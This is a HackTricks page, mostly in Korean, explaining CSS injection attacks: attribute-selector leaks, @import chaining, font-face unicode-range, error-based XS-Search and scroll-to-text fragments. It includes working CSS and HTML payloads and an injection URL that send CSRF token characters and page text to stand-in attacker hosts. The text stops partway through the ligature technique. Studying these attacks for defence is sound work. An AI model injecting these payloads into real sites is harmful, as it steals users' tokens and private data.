# CSS Injection

{% hint style="success" %}
AWS í•´í‚¹ ë°°ìš°ê¸° ë° ì—°ìŠµí•˜ê¸°:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
GCP í•´í‚¹ ë°°ìš°ê¸° ë° ì—°ìŠµí•˜ê¸°: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricks ì§€ì›í•˜ê¸°</summary>

* [**êµ¬ë… ê³„íš**](https://github.com/sponsors/carlospolop) í™•ì¸í•˜ê¸°!
* **ğŸ’¬ [**Discord ê·¸ë£¹**](https://discord.gg/hRep4RUj7f) ë˜ëŠ” [**í…”ë ˆê·¸ë¨ ê·¸ë£¹**](https://t.me/peass)ì— ì°¸ì—¬í•˜ê±°ë‚˜ **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**ë¥¼ íŒ”ë¡œìš°í•˜ì„¸ìš”.**
* **[**HackTricks**](https://github.com/carlospolop/hacktricks) ë° [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) ê¹ƒí—ˆë¸Œ ë¦¬í¬ì§€í† ë¦¬ì— PRì„ ì œì¶œí•˜ì—¬ í•´í‚¹ íŒì„ ê³µìœ í•˜ì„¸ìš”.**

</details>
{% endhint %}


## CSS Injection

### ì†ì„± ì„ íƒì

CSS ì„ íƒìëŠ” `input` ìš”ì†Œì˜ `name` ë° `value` ì†ì„± ê°’ì„ ì¼ì¹˜ì‹œí‚¤ë„ë¡ ì œì‘ë©ë‹ˆë‹¤. ì…ë ¥ ìš”ì†Œì˜ ê°’ ì†ì„±ì´ íŠ¹ì • ë¬¸ìë¡œ ì‹œì‘í•˜ë©´, ë¯¸ë¦¬ ì •ì˜ëœ ì™¸ë¶€ ë¦¬ì†ŒìŠ¤ê°€ ë¡œë“œë©ë‹ˆë‹¤:
```css
input[name=csrf][value^=a]{
background-image: url(https://attacker.com/exfil/a);
}
input[name=csrf][value^=b]{
background-image: url(https://attacker.com/exfil/b);
}
/* ... */
input[name=csrf][value^=9]{
background-image: url(https://attacker.com/exfil/9);
}
```
ê·¸ëŸ¬ë‚˜ ì´ ì ‘ê·¼ ë°©ì‹ì€ ìˆ¨ê²¨ì§„ ì…ë ¥ ìš”ì†Œ(`type="hidden"`)ë¥¼ ì²˜ë¦¬í•  ë•Œ ì œí•œì— ì§ë©´í•©ë‹ˆë‹¤. ìˆ¨ê²¨ì§„ ìš”ì†ŒëŠ” ë°°ê²½ì„ ë¡œë“œí•˜ì§€ ì•Šê¸° ë•Œë¬¸ì…ë‹ˆë‹¤.

#### ìˆ¨ê²¨ì§„ ìš”ì†Œ ìš°íšŒ

ì´ ì œí•œì„ ìš°íšŒí•˜ê¸° ìœ„í•´, `~` ì¼ë°˜ í˜•ì œ ê²°í•©ê¸°ë¥¼ ì‚¬ìš©í•˜ì—¬ í›„ì† í˜•ì œ ìš”ì†Œë¥¼ íƒ€ê²ŸíŒ…í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. ê·¸ëŸ¬ë©´ CSS ê·œì¹™ì´ ìˆ¨ê²¨ì§„ ì…ë ¥ ìš”ì†Œ ë‹¤ìŒì— ì˜¤ëŠ” ëª¨ë“  í˜•ì œì—ê²Œ ì ìš©ë˜ì–´ ë°°ê²½ ì´ë¯¸ì§€ê°€ ë¡œë“œë©ë‹ˆë‹¤:
```css
input[name=csrf][value^=csrF] ~ * {
background-image: url(https://attacker.com/exfil/csrF);
}
```
A practical example of exploiting this technique is detailed in the provided code snippet. You can view it [here](https://gist.github.com/d0nutptr/928301bde1d2aa761d1632628ee8f24e).

#### CSS ì¸ì ì…˜ì„ ìœ„í•œ ì „ì œ ì¡°ê±´

CSS ì¸ì ì…˜ ê¸°ë²•ì´ íš¨ê³¼ì ì´ê¸° ìœ„í•´ì„œëŠ” íŠ¹ì • ì¡°ê±´ì´ ì¶©ì¡±ë˜ì–´ì•¼ í•©ë‹ˆë‹¤:

1. **í˜ì´ë¡œë“œ ê¸¸ì´**: CSS ì¸ì ì…˜ ë²¡í„°ëŠ” ì œì‘ëœ ì„ íƒìë¥¼ ìˆ˜ìš©í•  ìˆ˜ ìˆë„ë¡ ì¶©ë¶„íˆ ê¸´ í˜ì´ë¡œë“œë¥¼ ì§€ì›í•´ì•¼ í•©ë‹ˆë‹¤.
2. **CSS ì¬í‰ê°€**: ìƒˆë¡œ ìƒì„±ëœ í˜ì´ë¡œë“œë¡œ CSSì˜ ì¬í‰ê°€ë¥¼ íŠ¸ë¦¬ê±°í•˜ê¸° ìœ„í•´ í˜ì´ì§€ë¥¼ í”„ë ˆì„í•  ìˆ˜ ìˆì–´ì•¼ í•©ë‹ˆë‹¤.
3. **ì™¸ë¶€ ë¦¬ì†ŒìŠ¤**: ì´ ê¸°ë²•ì€ ì™¸ë¶€ í˜¸ìŠ¤íŒ…ëœ ì´ë¯¸ì§€ë¥¼ ì‚¬ìš©í•  ìˆ˜ ìˆëŠ” ëŠ¥ë ¥ì„ ì „ì œë¡œ í•©ë‹ˆë‹¤. ì´ëŠ” ì‚¬ì´íŠ¸ì˜ ì½˜í…ì¸  ë³´ì•ˆ ì •ì±…(CSP)ì— ì˜í•´ ì œí•œë  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

### ë¸”ë¼ì¸ë“œ ì†ì„± ì„ íƒì

[**ì´ ê²Œì‹œë¬¼ì—ì„œ ì„¤ëª…ëœ ë°”ì™€ ê°™ì´**](https://portswigger.net/research/blind-css-exfiltration), **`:has`**ì™€ **`:not`** ì„ íƒìë¥¼ ê²°í•©í•˜ì—¬ ë¸”ë¼ì¸ë“œ ìš”ì†Œì—ì„œë„ ì½˜í…ì¸ ë¥¼ ì‹ë³„í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. ì´ëŠ” CSS ì¸ì ì…˜ì„ ë¡œë“œí•˜ëŠ” ì›¹ í˜ì´ì§€ì˜ ë‚´ìš©ì´ ë¬´ì—‡ì¸ì§€ ì „í˜€ ëª¨ë¥¼ ë•Œ ë§¤ìš° ìœ ìš©í•©ë‹ˆë‹¤.\
ë˜í•œ ì´ëŸ¬í•œ ì„ íƒìë¥¼ ì‚¬ìš©í•˜ì—¬ ë™ì¼í•œ ìœ í˜•ì˜ ì—¬ëŸ¬ ë¸”ë¡ì—ì„œ ì •ë³´ë¥¼ ì¶”ì¶œí•  ìˆ˜ë„ ìˆìŠµë‹ˆë‹¤:
```html
<style>
html:has(input[name^="m"]):not(input[name="mytoken"]) {
background:url(/m);
}
</style>
<input name=mytoken value=1337>
<input name=myname value=gareth>
```
ì´ê²ƒì„ ë‹¤ìŒ **@import** ê¸°ìˆ ê³¼ ê²°í•©í•˜ë©´, **[**blind-css-exfiltration**](https://github.com/hackvertor/blind-css-exfiltration)**ë¥¼ ì‚¬ìš©í•˜ì—¬ **ë¸”ë¼ì¸ë“œ í˜ì´ì§€ì—ì„œ CSS ì£¼ì…ìœ¼ë¡œ ë§ì€ ì •ë³´ë¥¼ ìœ ì¶œí•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.**

### @import

ì´ì „ ê¸°ìˆ ì—ëŠ” ëª‡ ê°€ì§€ ë‹¨ì ì´ ìˆìœ¼ë¯€ë¡œ, ì „ì œ ì¡°ê±´ì„ í™•ì¸í•´ì•¼ í•©ë‹ˆë‹¤. **í¬ìƒìì—ê²Œ ì—¬ëŸ¬ ë§í¬ë¥¼ ë³´ë‚¼ ìˆ˜ ìˆì–´ì•¼ í•˜ê±°ë‚˜**, **CSS ì£¼ì… ì·¨ì•½ í˜ì´ì§€ë¥¼ iframeìœ¼ë¡œ ë¶ˆëŸ¬ì˜¬ ìˆ˜ ìˆì–´ì•¼ í•©ë‹ˆë‹¤.**

ê·¸ëŸ¬ë‚˜ **CSS `@import`**ë¥¼ ì‚¬ìš©í•˜ì—¬ ê¸°ìˆ ì˜ í’ˆì§ˆì„ í–¥ìƒì‹œí‚¤ëŠ” ë˜ ë‹¤ë¥¸ ì˜ë¦¬í•œ ê¸°ìˆ ì´ ìˆìŠµë‹ˆë‹¤.

ì´ê²ƒì€ [**Pepe Vila**](https://vwzq.net/slides/2019-s3_css_injection_attacks.pdf)ì— ì˜í•´ ì²˜ìŒ ë³´ì—¬ì¡Œìœ¼ë©°, ë‹¤ìŒê³¼ ê°™ì´ ì‘ë™í•©ë‹ˆë‹¤:

ë§¤ë²ˆ ìˆ˜ì‹­ ê°œì˜ ë‹¤ë¥¸ í˜ì´ë¡œë“œë¡œ ê°™ì€ í˜ì´ì§€ë¥¼ ë°˜ë³µí•´ì„œ ë¡œë“œí•˜ëŠ” ëŒ€ì‹ (ì´ì „ê³¼ ê°™ì´), ìš°ë¦¬ëŠ” **ê³µê²©ìì˜ ì„œë²„ë¡œì˜ ì„í¬íŠ¸ë§Œìœ¼ë¡œ í˜ì´ì§€ë¥¼ í•œ ë²ˆë§Œ ë¡œë“œí•  ê²ƒì…ë‹ˆë‹¤**(ì´ê²ƒì´ í¬ìƒìì—ê²Œ ë³´ë‚¼ í˜ì´ë¡œë“œì…ë‹ˆë‹¤):
```css
@import url('//attacker.com:5001/start?');
```
1. importëŠ” **ê³µê²©ìë¡œë¶€í„° CSS ìŠ¤í¬ë¦½íŠ¸ ì¼ë¶€ë¥¼ ìˆ˜ì‹ í•  ê²ƒì´ê³ ** **ë¸Œë¼ìš°ì €ëŠ” ì´ë¥¼ ë¡œë“œí•  ê²ƒì…ë‹ˆë‹¤**.
2. ê³µê²©ìê°€ ë³´ë‚¼ CSS ìŠ¤í¬ë¦½íŠ¸ì˜ ì²« ë²ˆì§¸ ë¶€ë¶„ì€ **ë‹¤ì‹œ ê³µê²©ìì˜ ì„œë²„ì— ëŒ€í•œ ë˜ ë‹¤ë¥¸ `@import`ì…ë‹ˆë‹¤.**
1. ê³µê²©ìì˜ ì„œë²„ëŠ” ì´ ìš”ì²­ì— ì•„ì§ ì‘ë‹µí•˜ì§€ ì•Šì„ ê²ƒì´ë©°, ìš°ë¦¬ëŠ” ëª‡ ê°œì˜ ë¬¸ìë¥¼ ìœ ì¶œí•œ ë‹¤ìŒ ì´ importì— í˜ì´ë¡œë“œë¥¼ ì‘ë‹µí•˜ì—¬ ë‹¤ìŒ ë¬¸ìë¥¼ ìœ ì¶œí•˜ê³ ì í•©ë‹ˆë‹¤.
3. í˜ì´ë¡œë“œì˜ ë‘ ë²ˆì§¸ì´ì ë” í° ë¶€ë¶„ì€ **ì†ì„± ì„ íƒì ìœ ì¶œ í˜ì´ë¡œë“œ**ê°€ ë  ê²ƒì…ë‹ˆë‹¤.
1. ì´ëŠ” ê³µê²©ìì˜ ì„œë²„ì— **ë¹„ë°€ì˜ ì²« ë²ˆì§¸ ë¬¸ìì™€ ë§ˆì§€ë§‰ ë¬¸ìë¥¼** ë³´ë‚¼ ê²ƒì…ë‹ˆë‹¤.
4. ê³µê²©ìì˜ ì„œë²„ê°€ **ë¹„ë°€ì˜ ì²« ë²ˆì§¸ ë¬¸ìì™€ ë§ˆì§€ë§‰ ë¬¸ìë¥¼** ìˆ˜ì‹ í•˜ë©´, **2ë‹¨ê³„ì—ì„œ ìš”ì²­ëœ importì— ì‘ë‹µí•  ê²ƒì…ë‹ˆë‹¤**.
1. ì‘ë‹µì€ **2, 3 ë° 4ë‹¨ê³„**ì™€ ì •í™•íˆ ë™ì¼í•  ê²ƒì´ì§€ë§Œ, ì´ë²ˆì—ëŠ” **ë¹„ë°€ì˜ ë‘ ë²ˆì§¸ ë¬¸ìì™€ ê·¸ ë‹¤ìŒ ë§ˆì§€ë§‰ ë¬¸ìë¥¼ ì°¾ìœ¼ë ¤ê³  í•  ê²ƒì…ë‹ˆë‹¤**.

ê³µê²©ìëŠ” **ë¹„ë°€ì„ ì™„ì „íˆ ìœ ì¶œí•  ë•Œê¹Œì§€ ê·¸ ë£¨í”„ë¥¼ ë”°ë¥¼ ê²ƒì…ë‹ˆë‹¤**.

ì›ë³¸ [**Pepe Vilaì˜ ì´ ì½”ë“œë¥¼ ì—¬ê¸°ì„œ ì°¾ì•„ë³´ì„¸ìš”**](https://gist.github.com/cgvwzq/6260f0f0a47c009c87b4d46ce3808231) ë˜ëŠ” ê±°ì˜ [**ê°™ì€ ì½”ë“œì§€ë§Œ ì£¼ì„ì´ ë‹¬ë¦° ê²ƒì„ ì—¬ê¸°ì„œ ì°¾ì•„ë³´ì„¸ìš”**.](./#css-injection)

{% hint style="info" %}
ìŠ¤í¬ë¦½íŠ¸ëŠ” ë§¤ë²ˆ 2ê°œì˜ ë¬¸ìë¥¼ ë°œê²¬í•˜ë ¤ê³  ì‹œë„í•  ê²ƒì…ë‹ˆë‹¤ (ì‹œì‘ ë¶€ë¶„ê³¼ ë ë¶€ë¶„ì—ì„œ) ì™œëƒí•˜ë©´ ì†ì„± ì„ íƒìëŠ” ë‹¤ìŒê³¼ ê°™ì€ ì‘ì—…ì„ ê°€ëŠ¥í•˜ê²Œ í•˜ê¸° ë•Œë¬¸ì…ë‹ˆë‹¤:
```css
/* value^=  to match the beggining of the value*/
input[value^="0"]{--s0:url(http://localhost:5001/leak?pre=0)}

/* value$=  to match the ending of the value*/
input[value$="f"]{--e0:url(http://localhost:5001/leak?post=f)}
```
ì´ê²ƒì€ ìŠ¤í¬ë¦½íŠ¸ê°€ ë¹„ë°€ì„ ë” ë¹ ë¥´ê²Œ ìœ ì¶œí•  ìˆ˜ ìˆê²Œ í•´ì¤ë‹ˆë‹¤.  
{% endhint %}

{% hint style="warning" %}
ê°€ë” ìŠ¤í¬ë¦½íŠ¸ê°€ **ì ‘ë‘ì‚¬ + ì ‘ë¯¸ì‚¬ë¡œ ë°œê²¬ëœ ê²ƒì´ ì´ë¯¸ ì „ì²´ í”Œë˜ê·¸ì„ì„ ì˜¬ë°”ë¥´ê²Œ ê°ì§€í•˜ì§€ ëª»í•˜ê³ ** ê³„ì† ì•ìœ¼ë¡œ(ì ‘ë‘ì‚¬)ì™€ ë’¤ë¡œ(ì ‘ë¯¸ì‚¬) ì§„í–‰í•˜ì—¬ ì–´ëŠ ìˆœê°„ ë©ˆì¶œ ìˆ˜ ìˆìŠµë‹ˆë‹¤.\
ê±±ì •í•˜ì§€ ë§ˆì„¸ìš”, **ì¶œë ¥**ì„ í™•ì¸í•˜ë©´ **ê±°ê¸°ì—ì„œ í”Œë˜ê·¸ë¥¼ ë³¼ ìˆ˜ ìˆìŠµë‹ˆë‹¤**.  
{% endhint %}

### ë‹¤ë¥¸ ì„ íƒì

**CSS ì„ íƒì**ë¡œ DOM ë¶€ë¶„ì— ì ‘ê·¼í•˜ëŠ” ë‹¤ë¥¸ ë°©ë²•:

* **`.class-to-search:nth-child(2)`**: ì´ëŠ” DOMì—ì„œ "class-to-search" í´ë˜ìŠ¤ë¥¼ ê°€ì§„ ë‘ ë²ˆì§¸ í•­ëª©ì„ ê²€ìƒ‰í•©ë‹ˆë‹¤.
* **`:empty`** ì„ íƒì: ì˜ˆë¥¼ ë“¤ì–´ [**ì´ ê¸€**](https://github.com/b14d35/CTF-Writeups/tree/master/bi0sCTF%202022/Emo-Locker)**ì—ì„œ ì‚¬ìš©ë©ë‹ˆë‹¤:**

```css
[role^="img"][aria-label="1"]:empty { background-image: url("YOUR_SERVER_URL?1"); }
```

### ì˜¤ë¥˜ ê¸°ë°˜ XS-Search

**ì°¸ì¡°:** [CSS ê¸°ë°˜ ê³µê²©: @font-faceì˜ unicode-range ì•…ìš©](https://mksben.l0.cm/2015/10/css-based-attack-abusing-unicode-range.html), [@terjanqì˜ ì˜¤ë¥˜ ê¸°ë°˜ XS-Search PoC](https://twitter.com/terjanq/status/1180477124861407234)

ì „ë°˜ì ì¸ ì˜ë„ëŠ” **ì œì–´ëœ ì—”ë“œí¬ì¸íŠ¸ì—ì„œ ì‚¬ìš©ì ì •ì˜ ê¸€ê¼´ì„ ì‚¬ìš©í•˜ê³ ** **ì§€ì •ëœ ë¦¬ì†ŒìŠ¤(`favicon.ico`)ë¥¼ ë¡œë“œí•  ìˆ˜ ì—†ëŠ” ê²½ìš°ì—ë§Œ ì´ ê¸€ê¼´ë¡œ í…ìŠ¤íŠ¸(ì´ ê²½ìš° 'A')ê°€ í‘œì‹œë˜ë„ë¡ í•˜ëŠ” ê²ƒì…ë‹ˆë‹¤.**
```html
<!DOCTYPE html>
<html>
<head>
<style>
@font-face{
font-family: poc;
src: url(http://attacker.com/?leak);
unicode-range:U+0041;
}

#poc0{
font-family: 'poc';
}

</style>
</head>
<body>

<object id="poc0" data="http://192.168.0.1/favicon.ico">A</object>
</body>
</html>
```
1. **ì»¤ìŠ¤í…€ í°íŠ¸ ì‚¬ìš©**:
- `<head>` ì„¹ì…˜ì˜ `<style>` íƒœê·¸ ë‚´ì—ì„œ `@font-face` ê·œì¹™ì„ ì‚¬ìš©í•˜ì—¬ ì»¤ìŠ¤í…€ í°íŠ¸ë¥¼ ì •ì˜í•©ë‹ˆë‹¤.
- í°íŠ¸ ì´ë¦„ì€ `poc`ì´ë©° ì™¸ë¶€ ì—”ë“œí¬ì¸íŠ¸(`http://attacker.com/?leak`)ì—ì„œ ê°€ì ¸ì˜µë‹ˆë‹¤.
- `unicode-range` ì†ì„±ì€ íŠ¹ì • ìœ ë‹ˆì½”ë“œ ë¬¸ì 'A'ë¥¼ íƒ€ê²Ÿìœ¼ë¡œ í•˜ì—¬ `U+0041`ë¡œ ì„¤ì •ë©ë‹ˆë‹¤.

2. **ëŒ€ì²´ í…ìŠ¤íŠ¸ê°€ ìˆëŠ” ê°ì²´ ìš”ì†Œ**:
- `<body>` ì„¹ì…˜ì— `id="poc0"`ì¸ `<object>` ìš”ì†Œê°€ ìƒì„±ë©ë‹ˆë‹¤. ì´ ìš”ì†ŒëŠ” `http://192.168.0.1/favicon.ico`ì—ì„œ ë¦¬ì†ŒìŠ¤ë¥¼ ë¡œë“œí•˜ë ¤ê³  ì‹œë„í•©ë‹ˆë‹¤.
- ì´ ìš”ì†Œì˜ `font-family`ëŠ” `<style>` ì„¹ì…˜ì—ì„œ ì •ì˜ëœ `'poc'`ë¡œ ì„¤ì •ë©ë‹ˆë‹¤.
- ë¦¬ì†ŒìŠ¤(`favicon.ico`) ë¡œë“œì— ì‹¤íŒ¨í•˜ë©´ `<object>` íƒœê·¸ ë‚´ì˜ ëŒ€ì²´ ì½˜í…ì¸ (ë¬¸ì 'A')ê°€ í‘œì‹œë©ë‹ˆë‹¤.
- ì™¸ë¶€ ë¦¬ì†ŒìŠ¤ë¥¼ ë¡œë“œí•  ìˆ˜ ì—†ëŠ” ê²½ìš° ëŒ€ì²´ ì½˜í…ì¸ ('A')ëŠ” ì»¤ìŠ¤í…€ í°íŠ¸ `poc`ë¥¼ ì‚¬ìš©í•˜ì—¬ ë Œë”ë§ë©ë‹ˆë‹¤.

### ìŠ¤í¬ë¡¤-íˆ¬-í…ìŠ¤íŠ¸ í”„ë˜ê·¸ë¨¼íŠ¸ ìŠ¤íƒ€ì¼ë§

**`:target`** ì˜ì‚¬ í´ë˜ìŠ¤ëŠ” [CSS ì„ íƒì ë ˆë²¨ 4 ì‚¬ì–‘](https://drafts.csswg.org/selectors-4/#the-target-pseudo)ì—ì„œ ì§€ì •ëœ ëŒ€ë¡œ **URL í”„ë˜ê·¸ë¨¼íŠ¸**ì— ì˜í•´ íƒ€ê²ŸíŒ…ëœ ìš”ì†Œë¥¼ ì„ íƒí•˜ëŠ” ë° ì‚¬ìš©ë©ë‹ˆë‹¤. `::target-text`ëŠ” í…ìŠ¤íŠ¸ê°€ í”„ë˜ê·¸ë¨¼íŠ¸ì— ì˜í•´ ëª…ì‹œì ìœ¼ë¡œ íƒ€ê²ŸíŒ…ë˜ì§€ ì•ŠëŠ” í•œ ì–´ë–¤ ìš”ì†Œì™€ë„ ì¼ì¹˜í•˜ì§€ ì•ŠëŠ”ë‹¤ëŠ” ì ì„ ì´í•´í•˜ëŠ” ê²ƒì´ ì¤‘ìš”í•©ë‹ˆë‹¤.

ê³µê²©ìê°€ **ìŠ¤í¬ë¡¤-íˆ¬-í…ìŠ¤íŠ¸** í”„ë˜ê·¸ë¨¼íŠ¸ ê¸°ëŠ¥ì„ ì•…ìš©í•  ë•Œ ë³´ì•ˆ ë¬¸ì œê°€ ë°œìƒí•˜ë©°, ì´ë¥¼ í†µí•´ HTML ì£¼ì…ì„ í†µí•´ ìì‹ ì˜ ì„œë²„ì—ì„œ ë¦¬ì†ŒìŠ¤ë¥¼ ë¡œë“œí•˜ì—¬ ì›¹í˜ì´ì§€ì— íŠ¹ì • í…ìŠ¤íŠ¸ê°€ ì¡´ì¬í•˜ëŠ”ì§€ í™•ì¸í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. ì´ ë°©ë²•ì€ ë‹¤ìŒê³¼ ê°™ì€ CSS ê·œì¹™ì„ ì£¼ì…í•˜ëŠ” ê²ƒì„ í¬í•¨í•©ë‹ˆë‹¤:
```css
:target::before { content : url(target.png) }
```
ì´ëŸ¬í•œ ì‹œë‚˜ë¦¬ì˜¤ì—ì„œ "Administrator"ë¼ëŠ” í…ìŠ¤íŠ¸ê°€ í˜ì´ì§€ì— ì¡´ì¬í•˜ë©´, ë¦¬ì†ŒìŠ¤ `target.png`ê°€ ì„œë²„ì—ì„œ ìš”ì²­ë˜ì–´ í…ìŠ¤íŠ¸ì˜ ì¡´ì¬ë¥¼ ë‚˜íƒ€ëƒ…ë‹ˆë‹¤. ì´ ê³µê²©ì˜ í•œ ì˜ˆëŠ” ì£¼ì…ëœ CSSë¥¼ Scroll-to-text ì¡°ê°ê³¼ í•¨ê»˜ í¬í•¨í•˜ëŠ” íŠ¹ë³„íˆ ì œì‘ëœ URLì„ í†µí•´ ì‹¤í–‰ë  ìˆ˜ ìˆìŠµë‹ˆë‹¤:
```
http://127.0.0.1:8081/poc1.php?note=%3Cstyle%3E:target::before%20{%20content%20:%20url(http://attackers-domain/?confirmed_existence_of_Administrator_username)%20}%3C/style%3E#:~:text=Administrator
```
ì—¬ê¸°ì„œ ê³µê²©ì€ HTML ì£¼ì…ì„ ì¡°ì‘í•˜ì—¬ CSS ì½”ë“œë¥¼ ì „ì†¡í•˜ë©°, "Administrator"ë¼ëŠ” íŠ¹ì • í…ìŠ¤íŠ¸ë¥¼ ëª©í‘œë¡œ í•©ë‹ˆë‹¤. Scroll-to-text fragment(`#:~:text=Administrator`)ë¥¼ í†µí•´ í…ìŠ¤íŠ¸ê°€ ë°œê²¬ë˜ë©´, ì§€ì •ëœ ë¦¬ì†ŒìŠ¤ê°€ ë¡œë“œë˜ì–´ ê³µê²©ìì—ê²Œ ê·¸ ì¡´ì¬ë¥¼ ë¬´ì‹¬ì½” ì‹ í˜¸í•©ë‹ˆë‹¤.

ì™„í™”ë¥¼ ìœ„í•´ ë‹¤ìŒ ì‚¬í•­ì„ ìœ ì˜í•´ì•¼ í•©ë‹ˆë‹¤:

1. **ì œí•œëœ STTF ë§¤ì¹­**: Scroll-to-text Fragment (STTF)ëŠ” ë‹¨ì–´ ë˜ëŠ” ë¬¸ì¥ë§Œ ë§¤ì¹­í•˜ë„ë¡ ì„¤ê³„ë˜ì–´, ì„ì˜ì˜ ë¹„ë°€ì´ë‚˜ í† í°ì´ ìœ ì¶œë˜ëŠ” ëŠ¥ë ¥ì„ ì œí•œí•©ë‹ˆë‹¤.
2. **ìµœìƒìœ„ ë¸Œë¼ìš°ì§• ì»¨í…ìŠ¤íŠ¸ë¡œ ì œí•œ**: STTFëŠ” ì˜¤ì§ ìµœìƒìœ„ ë¸Œë¼ìš°ì§• ì»¨í…ìŠ¤íŠ¸ì—ì„œë§Œ ì‘ë™í•˜ë©°, iframe ë‚´ì—ì„œëŠ” ì‘ë™í•˜ì§€ ì•Šì•„, ì–´ë–¤ ì•…ìš© ì‹œë„ê°€ ì‚¬ìš©ìì—ê²Œ ë” ëˆˆì— ë„ê²Œ ë©ë‹ˆë‹¤.
3. **ì‚¬ìš©ì í™œì„±í™” í•„ìš”**: STTFëŠ” ì‘ë™í•˜ê¸° ìœ„í•´ ì‚¬ìš©ì í™œì„±í™” ì œìŠ¤ì²˜ê°€ í•„ìš”í•˜ë¯€ë¡œ, ì•…ìš©ì€ ì‚¬ìš©ì ì£¼ë„ íƒìƒ‰ì„ í†µí•´ì„œë§Œ ê°€ëŠ¥í•˜ë‹¤ëŠ” ì˜ë¯¸ì…ë‹ˆë‹¤. ì´ ìš”êµ¬ ì‚¬í•­ì€ ì‚¬ìš©ì ìƒí˜¸ì‘ìš© ì—†ì´ ê³µê²©ì´ ìë™í™”ë  ìœ„í—˜ì„ ìƒë‹¹íˆ ì™„í™”í•©ë‹ˆë‹¤. ê·¸ëŸ¼ì—ë„ ë¶ˆêµ¬í•˜ê³  ë¸”ë¡œê·¸ ê²Œì‹œë¬¼ì˜ ì €ìëŠ” ê³µê²© ìë™í™”ë¥¼ ìš©ì´í•˜ê²Œ í•  ìˆ˜ ìˆëŠ” íŠ¹ì • ì¡°ê±´ê³¼ ìš°íšŒ ë°©ë²•(ì˜ˆ: ì‚¬íšŒ ê³µí•™, ë„ë¦¬ ì‚¬ìš©ë˜ëŠ” ë¸Œë¼ìš°ì € í™•ì¥ê³¼ì˜ ìƒí˜¸ì‘ìš©)ì„ ì§€ì í•©ë‹ˆë‹¤.

ì´ëŸ¬í•œ ë©”ì»¤ë‹ˆì¦˜ê³¼ ì ì¬ì  ì·¨ì•½ì„±ì— ëŒ€í•œ ì¸ì‹ì€ ì›¹ ë³´ì•ˆì„ ìœ ì§€í•˜ê³  ì´ëŸ¬í•œ ì°©ì·¨ ì „ìˆ ë¡œë¶€í„° ë³´í˜¸í•˜ëŠ” ë° í•µì‹¬ì…ë‹ˆë‹¤.

ìì„¸í•œ ì •ë³´ëŠ” ì›ë³¸ ë³´ê³ ì„œë¥¼ í™•ì¸í•˜ì„¸ìš”: [https://www.secforce.com/blog/new-technique-of-stealing-data-using-css-and-scroll-to-text-fragment-feature/](https://www.secforce.com/blog/new-technique-of-stealing-data-using-css-and-scroll-to-text-fragment-feature/)

ì´ ê¸°ìˆ ì„ ì‚¬ìš©í•œ [**CTFìš© ìµìŠ¤í”Œë¡œì‡ì„ ì—¬ê¸°ì—ì„œ í™•ì¸í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤**](https://gist.github.com/haqpl/52455c8ddfec33aeefb468301d70b6eb).

### @font-face / unicode-range <a href="#text-node-exfiltration-i-ligatures" id="text-node-exfiltration-i-ligatures"></a>

íŠ¹ì • ìœ ë‹ˆì½”ë“œ ê°’ì— ëŒ€í•´ **ì™¸ë¶€ ê¸€ê¼´ì„ ì§€ì •í•  ìˆ˜ ìˆìœ¼ë©°**, í•´ë‹¹ ìœ ë‹ˆì½”ë“œ ê°’ì´ í˜ì´ì§€ì— ì¡´ì¬í•  ë•Œë§Œ **ìˆ˜ì§‘ë©ë‹ˆë‹¤**. ì˜ˆë¥¼ ë“¤ì–´:
```html
<style>
@font-face{
font-family:poc;
src: url(http://attacker.example.com/?A); /* fetched */
unicode-range:U+0041;
}
@font-face{
font-family:poc;
src: url(http://attacker.example.com/?B); /* fetched too */
unicode-range:U+0042;
}
@font-face{
font-family:poc;
src: url(http://attacker.example.com/?C); /* not fetched */
unicode-range:U+0043;
}
#sensitive-information{
font-family:poc;
}
</style>

<p id="sensitive-information">AB</p>htm
```
When you access this page, Chrome and Firefox fetch "?A" and "?B" because text node of sensitive-information contains "A" and "B" characters. But Chrome and Firefox do not fetch "?C" because it does not contain "C". This means that we have been able to read "A" and "B".

### Text node exfiltration (I): ligatures <a href="#text-node-exfiltration-i-ligatures" id="text-node-exfiltration-i-ligatures"></a>

**Reference:** [Wykradanie danych w Å›wietnym stylu â€“ czyli jak wykorzystaÄ‡ CSS-y do atakÃ³w na webaplikacjÄ™](https://sekurak.pl/wykradanie-danych-w-swietnym-stylu-czyli-jak-wykorzystac-css-y-do-atakow-na-webaplikacje/)

ì´ ê¸°ìˆ ì€ ê¸€ê¼´ ë¦¬ê°€ì²˜ë¥¼ ì´ìš©í•˜ì—¬ ë…¸ë“œì—ì„œ í…ìŠ¤íŠ¸ë¥¼ ì¶”ì¶œí•˜ê³  ë„ˆë¹„ ë³€í™”ë¥¼ ëª¨ë‹ˆí„°ë§í•˜ëŠ” ê²ƒì„ í¬í•¨í•©ë‹ˆë‹¤. ì´ ê³¼ì •ì€ ì—¬ëŸ¬ ë‹¨ê³„ë¡œ ì´ë£¨ì–´ì§‘ë‹ˆë‹¤:

1. **ì»¤ìŠ¤í…€ í°íŠ¸ ìƒì„±**:
- SVG í°íŠ¸ëŠ” ë‘ ë¬¸ì ì‹œí€€ìŠ¤ë¥¼ ë‚˜íƒ€ë‚´ëŠ” ê¸€ë¦¬í”„ì— ëŒ€í•´ í° ë„ˆë¹„ë¥¼ ì„¤ì •í•˜ëŠ” `horiz-adv-x` ì†ì„±ì„ ê°€ì§„ ê¸€ë¦¬í”„ë¥¼ ì‚¬ìš©í•˜ì—¬ ì œì‘ë©ë‹ˆë‹¤.
- ì˜ˆì‹œ SVG ê¸€ë¦¬í”„: `<glyph unicode="XY" horiz-adv-x="8000" d="M1 0z"/>`, ì—¬ê¸°ì„œ "XY"ëŠ” ë‘ ë¬¸ì ì‹œí€€ìŠ¤ë¥¼ ë‚˜íƒ€ëƒ…ë‹ˆë‹¤.
